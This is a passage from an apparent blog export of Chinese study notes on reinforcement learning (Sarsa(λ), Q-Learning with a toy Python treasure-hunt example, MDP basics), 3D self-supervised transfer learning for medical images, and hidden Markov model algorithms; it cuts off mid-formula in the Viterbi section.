的值为一个回合（episode）的步数时就变成了回合更新。对于多步更新的 Sarsa 算法我们用 $Sarsa(\lambda)$ 来统一表示，其中 $\lambda$ 的取值范围是 [ 0 , 1 ]，其本质是一个衰减值。 所谓的轨迹就是指状态、动作和奖励的一个历史序列，很多时候会遇到这个概念，所以这里简单提一句。 2. Sarsa ($\lambda$) 算法流程 $Sarsa(\lambda)$ 算法比 $Sarsa$ 算法中多了一个矩阵E (eligibility trace)，它用来保存在路径中所经历的每一步，并其值会不断地衰减。该矩阵的所有元素在每个回合的开始会初始化为 0，如果状态 s 和动作 a 对应的 E(s,a) 值被访问过，则会其值加一。并且矩阵 E 中所有元素的值在每步后都会进行衰减，这保证了离获得当前奖励越近的步骤越重要，并且如果前期智能体在原地打转时，经过多次衰减后其 E 值就接近于 0 了，对应的 Q 值几乎没有更新。 值得注意的是，在更新 Q(s,a) 和 E(s,a) 时，是对“整个表”做更新，但是因为矩阵 E 的初始值是 0，只有智能体走过的位置才有值，所以并不是真正的对“整个表”做更新，而是更新获得奖励值之前经过的所有步骤。而那些没有经过的步骤因为对应的 E(s,a) 值为0，所以 $Q(s,a)=Q(s,a)+\alpha\cdot\delta\cdot E(s,a)=Q(s,a)$，会保持原值不变。 3. 矩阵 E 的两种更新方式(1) accumulating trace：每次走到当前状态，则将当前的矩阵 E 的元素值+1，即：$$E(s,a)=E(s,a)+1$$(2) replacing trace：给矩阵 E 的元素值设置上限，使得其所有值在 [0 , 1] 之间，所以每次更新时先将当前状态所在的行清零，再将对应的 E(s,a) 置一，即：$$E(s,:)=0$$ $$E(s,a)=1$$ 从实践来说，第二种更新方式会更好一点。]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[周纵苇——三维迁移学习报告笔记]]></title>
    <url>%2F2019%2F10%2F10%2F3D-TL%2F</url>
    <content type="text"><![CDATA[本文主要是记录周纵苇（U-Net++的作者）大神关于三维迁移学习的报告的笔记。原文请参考三维迁移学习。 0. 研究背景医学图像的一大难点是标注困难，需要耗费医生大量的人力和物力。迁移学习可以从大量其他数据集中预训练得到初始的模型，在针对某个特定的任务时，可以让模型从一个更优的起点开始训练。在医学影像处理中，从ImageNet的预训练模型开始做迁移学习已经成为了一个标配，但是ImageNet的模型输入必须是二维的，并且存在医学图像与自然图像差别较大的问题。 3D的神经网络模型一般要优于2D的，但是也存在模型参数多，而训练样本少，容易导致过拟合和欠拟合的问题。此外还希望模型能够做到自监督学习，即直接从无标签数据中自行学习。他们提出的自监督学习方法就是先在原图上做一些改动，然后让模型去还原原图。并提出了四种可选的图形变换方法：非线性变换，局部像素重组，向内填充和向外填充。 1. 非线性变换在CT图像中，人体不同器官和组织是有不同的像素值（Hounsfield Units，亨斯菲尔德单位）的。现在只将某个组织的亨氏值的范围改变而其他诸如形态等特性都不变，如果网络模型能够将像素值还原为正确的范围，则说明该模型识别出了该组织的正确分类。 所以可以随机生成一个色彩变换曲线，并加到原图中，就得到了一张经过非线性变换的图片。值得注意的是该色彩变换曲线需要是单调的，因为需要在变换后的图像与原图之间建立起一一对应的关系，不然模型很难恢复。得到该曲线的方式有很多种，他们使用的是 Bezier Curve（贝塞尔曲线）的方式。 2. 局部打乱在原图中随机地选择一个局部小区域的位置和大小，并将该区域内的像素打乱。之所以是局部区域是因为卷积层的感知域是有限的，如果打乱的像素距离太远，复原原图就比困难了。我们希望模型能够复原被打乱的结构的细节纹理和边缘信息。 3. 内向填充和外向填充向外填充就是把原图的边缘一圈给遮住，然后让模型填充；向内填充就是把原图的中间一些区域遮住，让模型填充。遮住的方法是用一些随机的数替代原来的像素值。实验结果也表明，向外填充学习到的视觉特征更强。 4. 融合我们为以上 3 种图像变换都设置一个发生率，但是内填充和外填充不能同时发生，因为那样所留下的信息太少了。 5. 效果(1) 预训练的3D模型效果高于从头训练的3D模型 (2) 预训练的3D模型效果高于预训练的2D模型 (3) 用以上自监督学习方法预训练的2D模型效果和ImageNet的监督学习效果相近 6. 其他怎么用这个2D模型去处理3D的数据： （1）相邻的3层当作RGB三通道输入（2D） （2）相互正交的x，y，z面上的三层作为RGB三通道输入（2.5D） （3）先对3D的cube校准，然后把相互正交的x，y，z面上的三层作为RGB三通道输入（VIOR）。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[强化学习（1）：Q-Learning 算法]]></title>
    <url>%2F2019%2F10%2F10%2FQ-Learning%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关 Q-Learning 算法的内容，主要包括 on-policy 和 off-policy 的概念、Q-Learning 算法的基本思想和算法流程，最后还会讲解一个莫烦大神的例子。 1. on-policy 和 off-policyon-policy（同策略）：智能体在自己做的过程中学习，即选择动作的策略和更新值函数的策略是同一个策略。； off-policy（异策略）：智能体在看别人做的过程中学习，即选择动作的策略和更新值函数的策略不是同一个策略。； 上述两种也被译作在线学习和离线学习。 同策略时间差分：sarsa、sarsa($\lambda$) 异策略时间差分：重要性采样、Q-learning、Deep Q Network 关于时间（时序）差分（TD）算法这里只提一句我的理解：时间差分是和蒙特卡洛（MC）方法相对应的，后者是对一个回合（episode）的数据采样，而前者是对一步或多步的数据采样。采样完毕之后再去计算数据的均值啊之类的。 2. Q-Learning 算法Q-Learning 就是创造一个 Q 表来指导智能体的行动，Q 表的行是状态，列是动作。一个状态对应的动作的数值越大，则智能体采用该动作的概率越大。Q 表的每个值就是在上篇文章中提到的动作值函数 Q(s,a)。 Q 表更新公式如下：$$Q(S_t,A_t)\leftarrow Q(S_t,A_t)+\alpha[R_{t+1}+\gamma\cdot\max Q(S_{t+1})-Q(S_t,A_t)]$$其中 $\gamma$ 为衰减值；$\alpha$ 是学习率；$\max Q(S_{t+1})$ 是状态 $S_{t+1}$ 下概率最大的动作对应的 Q 表值，但是在实际行动时并不一定采取该行动；$R_{t+1}+\gamma\max Q(S_{t+1})$ 是根据贝尔曼方程得到的 $Q(S_{t+1},A_{t+1})$ 的推导值，后面称为 Q-target；而 $Q(S_t,A_t)$ 是 $Q(S_{t+1},A_{t+1})$ 的估计值，后面称为 Q-eval。$R_{t+1}+\gamma\max Q(S_{t+1})-Q(S_t,A_t)$ 就是两者的误差值，在后面的文章中也称其为 TD-error（时分误差）。 根据动作值函数的定义（见上一篇文章）有：$$Q(S_1)=R_2+\gamma Q(S_2)=R_2+\gamma [R_3+\gamma Q(S_3)]$$ $$=R_2+\gamma [R_3+\gamma [R_4+\gamma Q(S_4)]]=…$$ 所以：$$Q(S_1)=R_2+\gamma R_3+\gamma^2 R_4+\gamma^3 R_5+…$$ 当 $\gamma=1$ 时：$$Q(S_1)=R_2+R_3+R_4+R_5+…$$也就是动作值函数与该状态之后的所有奖励有关，并且其权重相等。 当 $\gamma=0$ 时：$$Q(S_1)=R_2$$也就是动作值函数只与该状态的前后一个奖励有关。 当 $0&lt;\gamma&lt;1$ 时：$$Q(S_1)=R_2+\gamma R_3+\gamma^2 R_4+\gamma^3 R_5+…$$也就是说 Q 表实现了奖励值的衰减，离当前状态越远的奖励衰减的越严重。 3. Q-Learning 算法流程 （1）初始化 Q 表（值全为 0 ） （2）根据当前状态选择一个 Action （3）执行 Action 并获得相应的奖励，以及下一个状态 （4）按照公式更新 Q 表 （5）将下一个状态设为当前状态 （6）重复 2-5 步 值得注意的是在 Q-Learning 算法中有两个“ 策略”，一个是选取动作的策略，另一个是更新 Q 表的策略。这两个策略分别采用的是 $\epsilon$贪婪算法和最大值算法，所以 Q-Learning 是 off-policy 的。 4. 探索-利用困境如果智能体仅仅按照 Q 表的最大概率指导行动的话，很多状态可能根本没办法达到，学习效率是比较低的，这就是探索-利用困境（Explore-Exploit dilemma）。可以用 $\epsilon$ 贪婪（$\epsilon-Greedy$）方法解决。 $\epsilon$ 贪婪方法就是设定一个 $0&lt;\epsilon&lt;1$，并以 $\epsilon$ 的概率按照 Q 表数值最大的动作行动，以 $1-\epsilon$ 的概率随机行动。 5. Q-Learning 版寻找宝藏的例子以下代码实现了一个智能体（用字符 ‘o’ 表示）寻找宝藏（用字符 ‘T’ 表示）的强化学习过程，所用的算法是 Q-Learning 算法。当智能体找到宝藏时奖励值为 1，反之为 0。智能体的动作只有两个—— left 和 right，即向左移动和向右移动。程序会显示智能体和宝藏的位置、每个回合的奖励值以及终止状态时 Q 表的情况。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import numpy as npimport pandas as pdimport timenp.random.seed(2)N_STATES = 6ACTIONS = ['left', 'right']EPSILON = 0.9ALPHA = 0.1GAMMA = 0.9MAX_EPISODES = 10 # 回合数FRESH_TIME = 0.3def build_q_table(n_states, actions): # 初始化 Q 表 table = pd.DataFrame( np.zeros((n_states, len(actions))), columns=actions, # 列的名称 ) return tabledef choose_action(state, q_table): # 根据当前状态和 Q 表选择一个动作 # 如果随机数的值大于 EPSIlON 或者 Q 表的当前列都是 0 （即第一次到达该状态） if (np.random.uniform() &gt; EPSILON or (q_table.iloc[state, :] == 0).all()): action_name = np.random.choice(ACTIONS) # 随机选择一个动作 else: action_name = q_table.iloc[state, :].idxmax() # 选择当前状态对应的值最大的动作 return action_namedef get_env_feedback(S, A): # 获取新的状态和对应的奖励 R = 0 if A == "right": # 往右 S_ = S + 1 else: # 往左 S_ = S - 1 if S_ &lt; 0: # 如果到达最左端 S_ = 0 if S_ == N_STATES - 1: # 如果找到宝藏 S_ = "terminal" R = 1 return S_, Rdef update_env(S, episode, step_counter): # 更新环境，主要是用来显示，可以不必搞懂 env_list = ['-'] * (N_STATES - 1) + ['T'] if S == "terminal": interaction = "Episode %s: total_steps = %s" % (episode + 1, step_counter) print("\r&#123;&#125;".format(interaction), end="") time.sleep(2) print("\r ", end="") else: env_list[S] = 'o' interaction = "".join(env_list) print("\r&#123;&#125;".format(interaction), end="") time.sleep(FRESH_TIME)def q_learning(): # Q-Learning 算法 q_table = build_q_table(N_STATES, ACTIONS) for episode in range(MAX_EPISODES): S = 0 step_counter = 0 # 共走了多少步 is_terminal = False update_env(S, episode, step_counter) while not is_terminal: A = choose_action(S, q_table) S_, R = get_env_feedback(S, A) # 下面的代码是为了更新 Q 表 q_predict = q_table.loc[S, A] if S_ != 'terminal': q_target = R + GAMMA * q_table.iloc[S_, :].max() else: # 终止状态 q_target = R is_terminal = True q_table.loc[S, A] += ALPHA * (q_target - q_predict) # 根据公式更新 S = S_ step_counter += 1 update_env(S, episode, step_counter) return q_tableif __name__ == "__main__": q_table = q_learning() print("\r\nQ-table:\n") print(q_table)]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[强化学习（0）：强化学习的基本概念与马尔科夫决策过程]]></title>
    <url>%2F2019%2F09%2F28%2FRL%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关强化学习的基本概念以及马尔科夫决策过程的相关内容。 关于强化学习的教程，我见过多种版本，每个老师所讲的内容提纲也有所差异，自己还没有完全搞清楚整个知识体系框架，所以下面先讲哪些共有的部分。 一、强化学习概述机器学习可以分为监督学习、无监督学习和强化学习（Reinforcement Learning）三个类别。有监督学习是任务驱动的，无监督学习是数据驱动的，强化学习是通过对环境的反馈来学习。 1. 强化学习的基本概念智能体（Agent）：强化学习系统； 环境（Environment）：与智能体交互的外部； 状态（State）：决定下一步将要发生什么的信息，t 时刻的状态通常记为 $S_t$； 动作（Action）：智能体根据当前状态所采取的动作，t 时刻的动作通常记为 $A_t$； 奖励（Reward）：一个及时的反馈信号，它表示智能体在第 t 步的表现，智能体的目的就是最大化累计奖励值。t 时刻的奖励通常记为 $R_t$； 收获（return）：在一个马尔科夫奖励链上从 t 时刻起往后所有奖励 R 的有衰减的累计和； 策略（Policy）：策略（通常记为 $\pi$）是决定智能体的行为的机制，是从一个状态到一个动作的映射，可以是确定的，也可以是不确定的。确定性策略： $a=\pi(s)$；随机策略：$\pi(a|s)=P(A_t=a|S_t=s)$； 值函数（Value function）：值函数是一个未来奖励的预测，用来评价当前状态的好坏程度。 状态转移概率矩阵：在状态 s 下采取动作 a 时，转移到下一个状态 s‘ 的概率，用 $P_{ss’}^a$ 表示。 下面是几个不常用的概念，只做了解就好。 学习（Learning）：在环境未知的情况下，智能体通过和环境交互来提升自己的策略； 规划（Planning）：在环境的模型已知的情况下，智能体只通过模型的计算来提升自己的策略； 学习和规划是序列决策中的两个基本问题。 探索（Exploration）：寻找关于环境的更多信息； 开发（Exploitation）：根据已知信息去最大化奖励； 开发就是在自己之前吃过的饭店里选一家最好吃的，而探索就是在没有吃过的饭店里不断尝试。 预测（Prediction）：给定策略去预测值函数； 控制（Control）：寻找最优策略； 2. 强化学习的基本思想及分类强化学习可以表示为智能体和环境的马尔科夫决策过程：智能体在第 t 步时执行行动 $A_t$，获得状态值 $S_t$ 和奖励值 $R_t$。环境接收到动作 $A_t$，产生新的状态 $S_{t+1}$ 和奖励 $R_{t+1}$。智能体根据奖励值不断调整自己的动作模式，以期得到最大的奖励值。以下为强化学习过程的示意图： 强学学习主要有两种分类方式： (1) 根据是建立对状态价值的估计来解决问题还是建立对决策的估计来解决问题，分为基于价值（Value-Based） 的 RL 和基于策略（Policy-Based）的 RL 两种。基于价值的RL输出所有动作的概率，按照概率分布选择动作，具体的算法有 Policy Gradients。基于价值的 RL 输出所有动作的价值，会根据最高价值来选择动作，具体的算法有 Q-Learning 和 Sarsa等。而 Actor-Critic 是两者的结合。 (2) 根据智能体在解决强化学习问题时是否需要建立环境模型，分为基于模型（Model-based）的 RL 和不需要模型（Model-free）的 RL 两类。 3. 举个例子 在上图所示的走迷宫例子中，红色的是智能体，黄色的是迷宫出口，黑色的陷阱，整个迷宫就是环境，迷宫一共有 $4\times 4=16$ 个格子，所以一共16个状态。智能体所能采取的动作只有四个——往上下左右方向移动。当智能体到达迷宫出口时奖励值为1，当智能体落入陷阱时奖励值为-1，其他情况奖励值为0。当然奖励值是需要事先给定的。我们的目标就是使智能体到达迷宫出口时获得的奖励值的总和最多。 二、马尔科夫决策过程在实际情况下，价值函数 $v_\pi$ 不仅与上一个状态和动作有关，而且还应该和之前所有的状态和动作有关。策略 $\pi(a|s)$ 和状态转移概率 $P_{ss’}^a$ 也是同理。但是这样会导致模型变得十分复杂， 为了简化模型，可以假设模型具有马尔科夫性。 1. 马尔科夫性马尔科夫性是指当前状态只取决于前一个状态，即$P(S_{t+1}|S_t)=P(S_{t+1}|S_1,S_2,…,S_t)$。 2. 马尔科夫过程（马尔科夫链）马尔科夫过程是一个具有马尔科夫性的随机状态序列 $S_1,S_2,…$ 。可以表示为二元组 $&lt;S,P&gt;$，其中 S 是一个有限的状态集合，P 是一个状态转移概率矩阵：$P_{ss’}=P(S_{t+1}=s’|S_t=s)$，即从一个状态转移到另一个状态的概率。 3. 马尔科夫奖励过程马尔科夫奖励过程就是一个具有奖励值的马尔科夫链，可表示为四元组 $&lt;S,P,R,\gamma&gt;$，其中 R 是奖励函数 $R_s=E(R_{t+1}|S_t=s)$，即当前状态可获得的奖励的期望值；$\gamma$ 是衰减因子，$\gamma\in[0,1]$。 4. 马尔科夫决策过程MDP是一个具有策略的马尔科夫奖励过程，可表示为五元组 $&lt;S,A,P,R,\gamma&gt;$，其中 A 是一个有限的动作集。P 是状态转移概率矩阵 $P_{ss’}^a=P(S_{t+1}=s’|S_t=s,A_t=a)$，R 是奖励函数 $R_s^a=E(R_{t+1}|S_t=s,A_t=a)$。 5. 常用概念的数学表达式当假设模型具有马尔科夫性后，一些概念的数学表达式就得到了进一步的简化。 策略：策略 $\pi$ 是一个给定状态 s 下关于动作 a 的分布：$\pi(a|s)=P(A_t=a|S_t=s)$； 收获：在一个马尔科夫奖励链上从 t 时刻起往后所有奖励的有衰减的累计和。其中衰减系数$\gamma$ 体现了未来的奖励在当前时刻的价值比例。记为：$$G_t=R_{t+1}+\gamma R_{t+2}+\gamma^2 R_{t+3}+…=\sum_{k=0}^\infty{\gamma^kR_{t+k+1}}$$衰减系数的引入可以避免存在环的马尔科夫链中奖励值无限大的情况。 （状态）值函数：从给定状态 s 出发，遵循策略 $\pi$，获得的回报 $G_t$ 的期望，记为：$$v_\pi(s)=E_\pi(G_t|S_t=s)$$动作值函数：从给定状态 s 出发，采取行动 a，遵循策略 $\pi$，获得的回报 $G_t$ 的期望，记为：$$q_\pi(s,a)=E_\pi(G_t|S_t=s,A_t=a)$$ 要计算值函数的话就需要将所有可能的路径列举出来，然后计算总奖励的期望，但是对于复杂问题而言穷举是不可能的，所以就需要各种算法来解决这个问题。]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习（10）：隐马尔可夫模型（HMM）]]></title>
    <url>%2F2019%2F09%2F27%2FHMM%2F</url>
    <content type="text"><![CDATA[本文将讲解有关隐马尔可夫模型的相关知识，主要包括隐马尔可夫模型的概念、两个基本假设、三个基本问题，以及解决这三个基本问题的前向-后向算法、Baum-Welch 算法和 Viterbi 算法等内容。 本文主要是依据李航老师的《统计学习方法》和邹博老师的机器学习教学视频总结编写的。文中所用到的有关机器学习的基本概念和方法可以参考本人博客中该系列之前的文章，或者直接上网搜索相关的内容。以下文章所列出的公式以及公式的推导读者们最好是在草稿本上自己推导一遍。由于本人水平所限，文章中难免有错误和不当之处，欢迎大家多多批评指正！ 一、隐马尔可夫模型 如上图所示，隐马尔可夫模型（HMM）一个关于时序的概率模型，红色圆圈是隐藏的不可观测的序列，被称为状态序列，其中 $i_t$ 的值只取决于它的前一个状态 $i_{t-1}$；绿色的矩形是可观测的序列，被称为观测序列。序列的每一个位置可以看作是一个时刻。 举个例子，在天气预报中，每天的天气情况就是 HMM 中的观测序列，而每一天对应的气压情况就是 HMM 中的状态序列，我们假设它是不可观测的，并且假设天气与气压有关。 为了后面描述的方便，下面先来引入几个定义。 设 Q 是所有可能的状态（红色圆圈）的结合，V 是所有可能的观测（绿色矩形）的集合：$$Q=(q_1,q_2,…,q_N)$$ $$V=(v_1,v_2,…,v_M)$$ 其中 N 是可能的状态数，M 是可能的观测数。 设 I 是长度为 T 的状态序列，O 是对应的观测序列：$$I=(i_1,i_2,…,i_T)$$ $$O=(o_1,o_2,…,o_T)$$ HMM可用符号 $\lambda$ 表示，该模型可由初始概率分布 $\pi$、状态转移概率分布 A 和观测概率分布 B 确定，即 $\lambda=(A,B,\pi)$。 *(1) 初始概率分布 $\pi$ *就是图中第一个红色圆圈 $i_1$ 取每个值的概率：$$\pi=(\pi_1,\pi_2,…,\pi_N)$$ $$\pi_i=P(i_1=q_i),\quad i=1,2,…N$$ 其中 $q_i$ 就是上面提到过的可能的状态。 *(2) 状态转移概率分布 A *就是在时刻 t 的红色圆圈 $i_t$ 的状态为 $q_i$ 的条件下，下一个时刻的红色圆圈 $i_{t+1}$ 的状态变为 $q_j$ 的概率：$$A=[a_{ij}]_{N\times N}$$ $$a_{ij}=P(i_{t+1}=q_j|i_t=q_i)$$ *(3) 观测概率分布 B *是指在时刻 t 红色圆圈 $i_t$ 的状态是 $q_i$ 的条件下，该时刻的观测值为 $v_k$ 的概率：$$B=[b_j(k)]_{N\times M}$$ $$b_j(k)=P(o_t=v_k|i_t=q_j)$$ 沿用上面天气预报的例子，在该例子中，每天的气压情况只与前一天的气压情况有关，则如果我们得知了第一天的气压情况（初始概率分布 $\pi$），又得知了每相邻两天气压的变化规律（状态转移概率分布 A）以及每天气压和天气之间的情况（观测概率分布 B），那么我们就可以预测第 T 天的天气情况了。 二、HMM 的两个基本假设和三个基本问题1. 两个基本假设(1) 齐次马尔科夫性假设： 假设隐藏的马尔科夫链（即图中红色圆圈形成的链条）在任意时刻 t 的状态只依赖于其前一个时刻。 (2) 观测独立假设： 假设任意时刻的观测只依赖于该时刻的马尔科夫链的状态。 2. 三个基本问题(1) 概率计算问题： 给定模型 $\lambda=(A,B,\pi)$ 和观测序列 $O=(o_1,o_2,…,o_T)$ 计算在模型 $\lambda$ 下观测序列 O 出现的概率 $P(O|\lambda)$。也就是计算模型和观测序列之间的匹配程度。 (2) 学习问题： 已知观测序列 $O=(o_1,o_2,…,o_T)$，估计模型 $\lambda=(A,B,\pi)$ 的参数，使得在该模型下观测序列出现的概率 $P(O|\lambda)$ 最大。也就是如何构造一个模型去最好的拟合观测数据。 (3) 预测问题： 又称解码问题。已知模型 $\lambda=(A,B,\pi)$ 和观测序列 $O=(o_1,o_2,…,o_T)$，求对给定观测序列条件下，概率 $p(I|O)$ 最大的状态序列 $I=(i_1,i_2,…,i_T)$。也就是给定观测序列，求最有可能的对应的状态序列。 针对以上三个基本问题，对每个问题的求解都提出了一种比较高效的解决方法，下面就是来分别介绍这些算法。 三、概率计算问题再放一遍最开始的图，以便和公式对照着看。 1. 直接计算法要解决的问题是计算模型和观测序列之间的匹配程度 $P(O|\lambda)$。可以先求出在给定模型 $\lambda$ 的前提下，生成状态序列 I 的概率 $P(I|\lambda)$，然后再求出模型和状态序列已知的情况下，生成观测序列 O 的概率 $P(O|I,\lambda)$。这样就可以利用公式 $P(O,I|\lambda)=P(O|I,\lambda)\cdot P(I|\lambda)$ 来计算了。其实也就是算出了 $P(O|\lambda)$，只不过还多求出了状态序列。 但是由于对于一个已知的观测序列 $O=(o_1,o_2,…,o_T)$ 来说，它可能是由多个不同的状态序列来生成的。先要想明白这句话是为什么。因为——每个状态 $i_t$ 都以一定的概率生成对应的观测 $o_t$，而每个状态 $i_t$ 又以一定的概率生成下一个状态 $o_{t+1}$。 所以可以通过枚举所有可能的长度为 T 的状态序列 $I=(i_1,i_2,…,i_T)$，然后对概率求和就可以得到最终的结果了。其公式如下：$$P(O|\lambda)=\sum_I{P(O|I,\lambda)\cdot P(I|\lambda)}$$但是这种暴力枚举的方式时间复杂度太高了，所以人们又提出了“前向-后向算法”来解决这个问题。 2. 前向算法前向-后向算法利用了类似于动态规划的思路来求解 $P(O|\lambda)$，前向算法从前往后计算概率，后向算法从后往前计算概率。 首先定义前向概率：给定隐马尔可夫模型 $\lambda$，定义到时刻 t 为止的部分观测序列为 $O=(o_1,o_2,…,o_t)$，并且第 t 个时刻的状态为 $q_i$ 的概率为前向概率。记作：$$\alpha_t(i)=P(o_1,o_2,…,o_T,i_t=q_i|\lambda)$$用前向概率计算 $P(O|\lambda)$ 过程如下： (1) 初值$$\alpha_1(i)=\pi_ib_{i}(o_1),\quad i=1,2,…,N$$ $\alpha_1(i)$ 表示第 1 个状态为 $q_i$，到此为止观测序列为 $o_1$ 的概率。就需要先以概率 $\pi_i$ 生成状态 $q_i$。再由该状态以概率 $b_{i,o_1}$ 生成观测 $o_1$ 。 (2) 递推 对 $t=1,2,…,T-1$$$\alpha_{t+1}(i)=[\sum_{j=1}^N{\alpha_t(j)a_{ji}}]b_i(o_{t+1}),\quad i=1,2,…,N$$ 在已知 $\alpha_t(j)$，即已知到前 t 个时刻为止的观测序列为 $o_1,o_2,…,o_t$，且第 t 时刻的状态为 $q_j$ 时，求 $\alpha_{t+1}(i)$ 的概率，即求到前 t+1 个时刻为止的观测序列为 $o_1,o_2,…,o_t,o_{t+1}$，且第 t+1 时刻的状态为 $q_i$ 的概率。需要先以上的基础上，以概率 $a_{ji}$ 由第 j 个状态 $q_j$ 生成下一个状态 $q_i$，然后再由以概率 $b_{i,o_{t+1}}$ 由下一个状态 $q_i$ 生成对应的观测 $o_{t+1}$。由于 t 时刻的状态 $q_j$ 可能有多种情况，所以还需要对 j 进行求和。 (3) 终止$$P(O|\lambda)=\sum_{i=1}^N{\alpha_T(i)}$$ $\alpha_T(i)$ 表示观测序列为 $O=(o_1,o_2,…,o_T)$，并且第 T 个时刻的状态为 $q_i$，对所有可能的状态求和就是最终要求的 $P(O|\lambda)$。 3. 后向算法后向概率：给定隐马尔可夫模型 $\lambda$，定义在时刻 t 状态为 $q_i$ 的条件下，从 t+1 到 T 时刻的部分观测序列为 $o_{t+1},o_{t+1},…,o_T$ 的概率为后向概率，记作：$$\beta_t(i)=P(o_{t+1},o_{t+1},…,o_T|i_t=q_i,\lambda)$$可以用与前向算法类似的方式递推得到 $P(O|\lambda)$： (1) 初值$$\beta_T(i)=1,\quad i=1,2,…,N$$由于 T 是最终的时刻，不存在从 T+1 到 T 的观测序列，所以概率为 1。 (2) 递推 对于 $t=T-1,T-2,…,1$$$\beta_t(i)=\sum_{j=1}^N{a_{ij}b_{j}(o_{t+1})\beta_{t+1}(j)},\quad i=1,2,…,N$$先从时刻 t+1 的状态 $p_j$ 以概率 $b_{j}(o_{t+1})$ 的概率生成对应的观测 $o_{t+1}$。而状态 $p_j$ 是由时刻 t 的状态 $p_i$ 以概率 $a_{ij}$ 生成的。 (3) 终止$$P(O|\lambda)=\sum_{i=1}^N{\pi_ib_{i}(o_1)\beta_1(i)}$$同理，倒着递推出最终的表达式。 4. 一些概率和期望值下面给出某些概率和期望值的计算公式，在后面的算法中会用到其中的几个。 四、学习问题学习问题是如何构造一个模型去最好的拟合观测数据。 如果训练数据包括观测序列和状态序列，则 HMM 的学习是监督学习；若只有观测序列，则 HMM的学习需要用 EM 算法解决，是非监督学习。 1. 监督学习方法因为训练数据包括观测序列和状态序列，所以要求的模型的参数 $a_{ij},b_i(j)$ 和 $\pi_i$ 都可以通过统计训练数据中它们出现的频率来近似表示。 2. Baum-Welch 算法（1）EM 算法的 E 步：先写出 Q 函数：$$Q(\lambda,\bar{\lambda})=\sum_I\log P(O,I|\lambda)P(O,I|\bar\lambda)$$其中 $\bar\lambda$ 是隐马尔可夫模型参数的当前估计值，$\lambda$ 是要极大化的隐马尔可夫模型参数。 因为 $P(O,I|\lambda)=\pi_{i_1}b_{i_1}(o_1)a_{i_1}b_{i_2}(o_2)…a_{i_{T-1}i_T}b_{i_T}(o_T)$，所以 $Q(\lambda,\bar\lambda)$ 可以写为：$$Q(\lambda,\bar{\lambda})=\sum_I\log\pi_{i_1} P(O,I|\bar\lambda)+\sum_I(\sum_{t=1}^{T-1}\log a_{i_t,i_{t+1}})P(O,I|\bar\lambda)$$ $$+\sum_I(\sum_{t=1}^T\log b_{i_t}(o_t))P(O,I|\bar\lambda)\quad\quad公式(1)$$ （2）EM 算法的 M 步：这一步要极大化 Q 函数求模型的参数 $A,B,\pi$ 。 公式 (1) 中的第 1 项可以写为：$$\sum_I\log\pi_{i_1} P(O,I|\bar\lambda)=\sum_{i=1}^N\log\pi_{i} P(O,i_1=i|\bar\lambda)$$因为上式满足约束条件 $\sum_{i=1}^N{\pi_i=1}$，利用拉格朗日乘子法得拉氏函数为：$$L=\sum_{i=1}^N\log\pi_{i} P(O,i_1=i|\bar\lambda)+\gamma(\sum_{i=1}^N{\pi_i-1})$$拉氏函数对 $\pi_i$ 求偏导，并令结果为 0 得：$$P(O,i_1=i|\bar\lambda)+\gamma\pi_i=0\quad\quad公式(2)$$上式在求导后的原式的基础上两边同乘了 $\pi_i$。上式对 i 求和得：$$\gamma=-P(O|\bar\lambda)$$将其带入公式 (2) 得：$$\pi_i=\frac{P(O,i_1=i|\bar\lambda)}{P(O|\bar\lambda)}$$ 同理公式 (1) 的第 2 项的约束条件为 $\sum_{j=1}^Na_{ij}=1$，第 3 项的约束条件为 $\sum_{k=1}^Mb_j(k)=1$，可以分别得：$$a_{ij}=\frac{\sum_{t=1}^{T-1}P(O,i_t=i,i_{t+1=j}|\bar\lambda)}{\sum_{t=1}^{T-1}P(O,i_t=i|\bar\lambda)}$$ $$b_j(k)=\frac{\sum_{t=1}^TP(O,i_t=j|\bar\lambda)I(o_t=v_k)}{\sum_{t=1}^TP(O,i_t=j|\bar\lambda)}$$ 而以上三个式子利用第三部分第4小节中的公式 (10.24) 和公式 (10.26) 就可以计算。 五、预测问题预测问题是给定观测序列，求最有可能的对应的状态序列。解决预测问题有两个方法，一个是近似算法，另一个是维特比算法。 1. 近似算法近似算法的思想是分别求出每个时刻最有可能的状态，把它们形成的状态序列作为预测结果。但是不能保证这种由局部最优解组合得到的状态序列就是全局最优解。 给定隐马尔可夫模型 $\lambda$ 和观测序列 O，在时刻 t 出于状态 $q_i$ 的概率 $\gamma_t(i)$ 可以由公式 (10.24) 计算得到。然后对每个时刻的状态求最大值，就得到了当前时刻最有可能的状态。 2. 维特比算法维特比算法的本质是利用动态规划算法求解概率最优路径 $I^=(i_1^,i_2^,…,i_T^)$，一条路径对应着一个状态序列。 最优路径有这样的特性：如果最优路径在时刻 t 的状态为 $i_t^$，那么从 $i_t^$ 到终点 $i_T^*$ （时刻 T 的状态）的这部分序列，对于任意的从时刻 t 到时刻 T 的状态序列来说都是最优的。不然就可以将其替换得到更优的序列。 所以可以先求得最优路径的终点 $i_T^$，然后从后往前递推的得到状态节点 $i_{T-1}^,i_{T-2}^,…,i_1^$，从而得到最优的路径 $I^=(i_1^,i_2^,…,i_T^)$。 首先引入两个变量 $\delta$ 和 $\psi$。定义在时刻 t 状态为 i 的所有单个路径 $(i_1,i_2，…，i_t)$ 中概率最大值为：$$\delta_t(i)=\max_{i_1,i_2，…，i_{t-1}}P(i_t=i,i_{t-1},…,i_1,o_t,…,o_1|\lambda)$$其递推式为：$$\delta_{t+1}(i)=\max_{i_1,i_2，…，i_t}P(i_{t+1}=i,i_t,…,i_1,o_{t+1},…,o_1|\lambda)$$ $$=\max_{1\leq j\leq N}[\delta_t(j)a_{ji}]b_i(o_{t+1})$$ 定义在时刻 t 状态为 i 的所有单个路径 $(i_1,i_2，…，i_{t-1},i)$ 中概率最大的路径的第 t-1 个节点为：$$\psi_t(i)=\arg\max_{1\leq j\leq N}[\delta_{t-1}(j)a_{ji}]$$ 维特比算法 (1) 初始化$$\delta_1(i)=\pi_ib_i(o_1)$$ $$\psi_1(i)=0$$ (2) 递推 对于 $t=2,3,…,T$，有$$\delta_t(i)==\max_{1\leq 